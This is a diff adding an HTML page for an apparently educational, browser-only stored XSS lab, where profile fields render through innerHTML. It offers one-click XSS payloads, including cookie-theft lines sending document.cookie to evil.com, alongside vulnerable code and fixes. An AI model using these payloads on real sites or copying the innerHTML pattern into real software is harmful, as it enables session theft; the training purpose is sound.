@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Lab #5: Edit Profile</title>
+    <link rel="stylesheet" href="style/style_lab/style.css">
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>XSS Security Lab</h1>
+        <p class="tagline">Stored XSS - Profile Edit</p>
+        <p class="author">Test Your Knowledge</p>
+    </div>
+
+    <div class="lab-card">
+        <div class="badge">VULNERABLE - Stored XSS</div>
+        <h2 style="color: #facc15;">Lab #5: Edit Your Profile</h2>
+        <p class="subtitle">Inject XSS payload into profile fields - persists across pages</p>
+
+        <div class="description">
+            This is the <strong>profile editor</strong>. User data is saved to <code>localStorage</code> 
+            and displayed on the <strong>profile viewer page</strong> using <code>innerHTML</code> without sanitization.<br><br>
+            <strong>Goal:</strong> Inject a script that executes when viewing the profile on 
+            <a href="lab5-view.html" style="color: var(--accent);">lab5-view.html</a>.
+        </div>
+
+        <div class="vulnerable-section">
+            <div class="section-label">PROFILE EDITOR - INJECT XSS HERE</div>
+            
+            <form class="comment-form" onsubmit="return false;">
+                <label style="color: var(--muted); font-size: 14px;">Username:</label>
+                <input type="text" id="username" placeholder="Enter username.. (XSS payloads accepted!)." value="">
+                
+                <label style="color: var(--muted); font-size: 14px;">Bio (supports HTML!):</label>
+                <textarea id="bio" placeholder="Tell us about yourself... (XSS payloads accepted!)"></textarea>
+                
+                <label style="color: var(--muted); font-size: 14px;">Website:</label>
+                <input type="text" id="website" placeholder="https://... (XSS payloads accepted!)" value="">
+                
+                <label style="color: var(--muted); font-size: 14px;">Location:</label>
+                <input type="text" id="location" placeholder="City, Country... (XSS payloads accepted!)" value="">
+                
+                <div class="button-group">
+                    <button onclick="saveProfile()" class="tooltip">
+                        Save Profile
+                        <span class="tooltiptext">Saves to localStorage</span>
+                    </button>
+                    <button class="btn-info" onclick="window.location.href='lab5-view.html'">
+                        View Profile
+                    </button>
+                    <button class="btn-danger" onclick="clearProfile()">
+                        Clear Profile
+                    </button>
+                </div>
+            </form>
+
+            <!-- Quick Payloads -->
+            <div class="payload-bar">
+                <span style="font-size: 0.85rem; color: #94a3b8;">Quick XSS Payloads for Bio:</span>
+                <button class="payload-btn" onclick="insertPayload('bio', '<img src=x onerror=alert(\\'XSS!\\')>')">
+                    &lt;img onerror&gt;
+                </button>
+                <button class="payload-btn danger" onclick="insertPayload('bio', '<svg onload=alert(document.cookie)>')">
+                    Cookie Theft
+                </button>
+                <button class="payload-btn danger" onclick="insertPayload('bio', '<script>alert(\\'Stored XSS\\')</script>')">
+                    &lt;script&gt;
+                </button>
+                <button class="payload-btn danger" onclick="insertPayload('bio', '<iframe src=javascript:alert(1)>')">
+                    &lt;iframe&gt;
+                </button>
+            </div>
+
+            <!-- Advanced Payloads -->
+            <div class="payload-bar">
+                <span style="font-size: 0.85rem; color: #94a3b8;">Stealth Payloads:</span>
+                <button class="payload-btn danger" onclick="insertPayload('bio', '<style>body{display:none}</style>')">
+                    Hide Page
+                </button>
+                <button class="payload-btn danger" onclick="insertPayload('bio', '<img src=x onerror=fetch(\\'https://evil.com/steal?c=\\'+document.cookie)>')">
+                    Steal Cookies
+                </button>
+                <button class="payload-btn danger" onclick="insertPayload('bio', '<form action=evil.com><input name=c value=\\'\\'+document.cookie></form><script>document.forms[0].submit()</script>')">
+                    Form Hijack
+                </button>
+            </div>
+        </div>
+
+        <!-- Storage Info -->
+        <div class="storage-info">
+            <strong>Storage Status:</strong> 
+            <span id="storageStatus" style="color: var(--warning);">Checking...</span>
+            <br><small style="color: var(--muted);">Data persists in localStorage until cleared</small>
+        </div>
+
+        <!-- Solution Toggle -->
+        <button onclick="toggleSolution()" id="solutionBtn" class="btn-success" style="width:100%;">
+            Show Solution & Fix
+        </button>
+        
+        <div class="solution-panel" id="solutionPanel">
+            <h3>Solution & Explanation</h3>
+            
+            <h4>How Stored XSS Works in Profiles:</h4>
+            <p style="color: var(--muted); font-size: 13px; margin-bottom: 15px;">
+                1. Attacker injects payload into profile fields<br>
+                2. Payload saved to localStorage (or database in real apps)<br>
+                3. Any user viewing the profile triggers the XSS<br>
+                4. Payload persists until profile is deleted
+            </p>
+
+            <h4>Working Payloads for Bio Field:</h4>
+            <ul>
+                <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code> — Image error event</li>
+                <li><code>&lt;svg onload=alert(document.cookie)&gt;</code> — SVG onload</li>
+                <li><code>&lt;body onload=alert('Hacked')&gt;</code> — Body onload</li>
+                <li><code>&lt;iframe src=javascript:alert(1)&gt;</code> — Iframe JS</li>
+            </ul>
+
+            <h4 style="color: #fff; margin-top: 20px;">Vulnerable Code:</h4>
+            <pre>// Profile viewer (lab5-view.html) uses innerHTML
+function displayProfile() {
+    const profile = JSON.parse(localStorage.getItem('profile'));
+    // VULNERABLE: Direct innerHTML injection
+    document.getElementById('bioDisplay').innerHTML = profile.bio;
+    document.getElementById('websiteLink').href = profile.website;
+}</pre>
+
+            <h4 style="color: #fff; margin-top: 20px;">Fix (Secure Code):</h4>
+            <pre>// FIX 1: Use textContent for bio
+document.getElementById('bioDisplay').textContent = profile.bio;
+
+// FIX 2: Validate and sanitize website
+function safeUrl(url) {
+    if (url.startsWith('https://') || url.startsWith('http://')) {
+        const a = document.createElement('a');
+        a.href = url;
+        return a.href; // Browser-validated URL
+    }
+    return '#';
+}
+
+// FIX 3: DOMPurify for rich text
+document.getElementById('bioDisplay').innerHTML = 
+    DOMPurify.sanitize(profile.bio);</pre>
+            
+            <hr>
+            <p style="color: #555; font-size: 12px;">This lab runs entirely in your browser — safe for educational purposes.</p>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <div class="button-container">
+        <button class="nav-btn btn-home" onclick="window.location.href='index.html'">
+            <span class="btn-icon"></span> Back to Home
+        </button>
+        <button class="nav-btn btn-prev" onclick="window.location.href='lab4.html'">
+            <span class="btn-icon">&#8592;</span> Previous Lab
+        </button>
+        <button class="nav-btn btn-next" onclick="window.location.href='lab6.html'">
+            Next Lab <span class="btn-icon">&#8594;</span>
+        </button>
+    </div>
+
+    <div class="footer">
+        <p>Educational purposes only. Never deploy vulnerable code to production.</p>
+    </div>
+</div>
+
+<script>
+    const STORAGE_KEY = 'xss_lab_profile';
+
+    // Load existing profile
+    function loadProfile() {
+        const stored = localStorage.getItem(STORAGE_KEY);
+        if (stored) {
+            const profile = JSON.parse(stored);
+            document.getElementById('username').value = profile.username || '';
+            document.getElementById('bio').value = profile.bio || '';
+            document.getElementById('website').value = profile.website || '';
+            document.getElementById('location').value = profile.location || '';
+            updateStorageStatus(true);
+        } else {
+            updateStorageStatus(false);
+        }
+    }
+
+    // Save profile to localStorage
+    function saveProfile() {
+        const profile = {
+            username: document.getElementById('username').value || 'Anonymous',
+            bio: document.getElementById('bio').value || '',
+            website: document.getElementById('website').value || '#',
+            location: document.getElementById('location').value || 'Unknown',
+            lastUpdated: new Date().toISOString()
+        };
+
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(profile));
+        updateStorageStatus(true);
+        
+        // Visual feedback
+        const saveBtn = document.querySelector('.button-group button');
+        saveBtn.textContent = 'Profile Saved!';
+        setTimeout(() => {
+            saveBtn.innerHTML = 'Save Profile';
+        }, 2000);
+    }
+
+    // Clear profile
+    function clearProfile() {
+        if (confirm('Delete profile? This cannot be undone.')) {
+            localStorage.removeItem(STORAGE_KEY);
+            document.getElementById('username').value = '';
+            document.getElementById('bio').value = '';
+            document.getElementById('website').value = '';
+            document.getElementById('location').value = '';
+            updateStorageStatus(false);
+        }
+    }
+
+    // Insert payload into field
+    function insertPayload(fieldId, payload) {
+        const field = document.getElementById(fieldId);
+        field.value = payload;
+        
+        // Auto-save after inserting payload
+        setTimeout(() => saveProfile(), 500);
+    }
+
+    // Update storage status indicator
+    function updateStorageStatus(hasData) {
+        const status = document.getElementById('storageStatus');
+        if (hasData) {
+            status.innerHTML = '<strong style="color: #2ed573;">Profile data stored</strong>';
+        } else {
+            status.innerHTML = '<strong style="color: #ff4757;">No profile data</strong>';
+        }
+    }
+
+    // Solution toggle
+    function toggleSolution() {
+        const panel = document.getElementById('solutionPanel');
+        const btn = document.getElementById('solutionBtn');
+        if (panel.classList.contains('show')) {
+            panel.classList.remove('show');
+            btn.textContent = 'Show Solution & Fix';
+        } else {
+            panel.classList.add('show');
+            btn.textContent = 'Hide Solution & Fix';
+        }
+    }
+
+    // Keyboard shortcut
+    document.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+            e.preventDefault();
+            saveProfile();
+        }
+    });
+
+    // Initialize
+    window.addEventListener('DOMContentLoaded', function() {
+        loadProfile();
+        console.log('Stored XSS Profile Editor Ready');
+        console.log('Inject payload in Bio field, then view profile');
+    });
+</script>
+</body>
+</html>
